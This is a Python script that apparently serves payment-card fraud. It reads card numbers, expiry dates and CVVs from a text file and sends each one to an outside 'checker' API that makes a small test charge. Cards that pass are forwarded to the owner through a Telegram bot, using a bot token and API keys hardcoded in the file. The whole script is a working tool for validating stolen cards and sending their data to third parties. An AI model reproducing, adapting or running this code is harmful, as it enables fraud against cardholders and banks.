import requests
from pyrogram import Client

api_id = 10337096
api_hash = "44eb4f665fe6c15824c5b469d1111424"
bot_token = "7409887822:AAHCzvu4htx3tHvtV2mRn4t6r_IIzzVKyeg"
owner_id = 7196525260

def charge_card(cc_info):
    url = "https://daxxteam.com/chk/api.php"
    params = {
        'lista': cc_info,
        'mode': 'cvv',
        'amount': 0.5,
        'currency': 'eur'
    }
    response = requests.get(url, params=params)
    return response.text

def send_message_to_owner(bot, message):
    bot.send_message(chat_id=owner_id, text=message)

app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

with open("cc.txt", "r") as file:
    for line in file:
        cc_info = line.strip()

        if "|" not in cc_info or len(cc_info.split("|")) != 4:
            print(f"Invalid card format: {cc_info}")
            continue 

        result = charge_card(cc_info)
        print(result)
        
        if "✅" in result:
            message = f"{result}"
            with app:
                send_message_to_owner(app, message)
